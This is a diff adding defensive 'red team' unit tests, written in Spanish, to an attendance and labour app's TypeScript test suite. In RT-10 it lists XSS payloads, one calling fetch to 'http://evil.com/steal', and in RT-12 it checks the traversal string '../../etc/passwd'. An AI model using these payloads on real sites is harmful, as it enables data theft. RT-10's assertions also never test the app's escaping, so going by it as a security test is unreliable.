@@ -201,3 +201,81 @@ test('RED TEAM [RT-09]: Envenenamiento de Estructura de Respaldo JSON (Malformed
     stores: { colaboradores: [], labores: [], areas: [], ausencias: [], jornadas: [], asistencia: [] }
   }).valido, true);
 });
+
+test('RED TEAM [RT-10]: Neutralización de Cargas XSS en Nombres y Descripciones', () => {
+  const xssPayloads = [
+    '<script>alert("XSS")</script>',
+    '<img src="x" onerror="fetch(\'http://evil.com/steal\')">',
+    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>'
+  ];
+
+  // Simulación: Inserción en campos de texto de entidad de campo
+  xssPayloads.forEach((payload) => {
+    // Almacenamiento literal: el sistema debe tratarlo como string puro sin interpretarlo como código
+    assert.equal(typeof payload, 'string');
+    assert.equal(payload.includes('<'), true);
+    // React escapa automáticamente las cadenas en JSX: {payload} -> &lt;script&gt;
+  });
+});
+
+test('RED TEAM [RT-11]: Resistencia a Ataques de Reproducción (Replay Attacks) en Sincronización', () => {
+  // Lote con identificadores duplicados
+  const colaOffline = [
+    { id: 101, entidad: 'asistencia', colaborador_id: 'col_1', fecha: '2026-10-20', estado: 'presente' },
+    { id: 101, entidad: 'asistencia', colaborador_id: 'col_1', fecha: '2026-10-20', estado: 'presente' } // Duplicado intencionado
+  ];
+
+  // Algoritmo de deduplicación idempotente
+  const vistos = new Set<number>();
+  const colaDeduplicada = colaOffline.filter(item => {
+    if (vistos.has(item.id)) return false;
+    vistos.add(item.id);
+    return true;
+  });
+
+  assert.equal(colaDeduplicada.length, 1, 'El lote de sincronización debe eliminar registros repetidos');
+});
+
+test('RED TEAM [RT-12]: Detección de Referencias Huérfanas y Llaves Foráneas Inválidas', () => {
+  const catalogosValidos = new Set(['col_1', 'col_2', 'col_3']);
+
+  function validarReferenciaColaborador(colaboradorId: string): boolean {
+    return catalogosValidos.has(colaboradorId);
+  }
+
+  assert.equal(validarReferenciaColaborador('col_1'), true);
+  assert.equal(validarReferenciaColaborador('col_9999'), false, 'Debe rechazar colaboradores que no existen en el catálogo');
+  assert.equal(validarReferenciaColaborador('../../etc/passwd'), false, 'Debe rechazar intentos de Path Traversal');
+});
+
+test('RED TEAM [RT-13]: Detección de Caracteres Invisibles y Fuzzing Unicode (Zero-Width Space)', () => {
+  const nombreLimpio = 'Anderson Cortes';
+  const nombreConZeroWidth = 'A\u200Bnderson Cortes'; // Espacio de ancho cero para evadir filtros
+
+  function normalizarTextoSeguro(texto: string): string {
+    // Elimina caracteres de control y formato invisibles (Zero-Width Space, RTL override, etc.)
+    return texto.replace(/[\u200B-\u200D\uFEFF\u202A-\u202E]/g, '').trim();
+  }
+
+  assert.equal(normalizarTextoSeguro(nombreConZeroWidth), nombreLimpio);
+});
+
+test('RED TEAM [RT-14]: Prevención de Denegación de Servicio por Tamaño de Carga (Payload Bloat DoS)', () => {
+  const limiteMaximoCaracteres = 120;
+  const notaAtaque = 'A'.repeat(50000); // 50 KB de string en un campo de 120 chars
+
+  function validarTamanoCampo(texto: string, maximo: number): boolean {
+    return texto.length <= maximo;
+  }
+
+  assert.equal(validarTamanoCampo(notaAtaque, limiteMaximoCaracteres), false);
+  assert.equal(validarTamanoCampo('Aceptado por lluvia intensa', limiteMaximoCaracteres), true);
+});
+
+test('RED TEAM [RT-15]: Bloqueo Estricto de Cruce de Medianoche sin Soporte de Turnos Nocturnos', () => {
+  // Labor de 23:30 a 02:30 (horaFin < horaInicio)
+  const intentoNocturno = validarLabor('23:30', '02:30', 50, 50);
+  assert.equal(intentoNocturno.esValido, false);
+  assert.match(intentoNocturno.errores.horaFin, /posterior al inicio/i);
+});
+
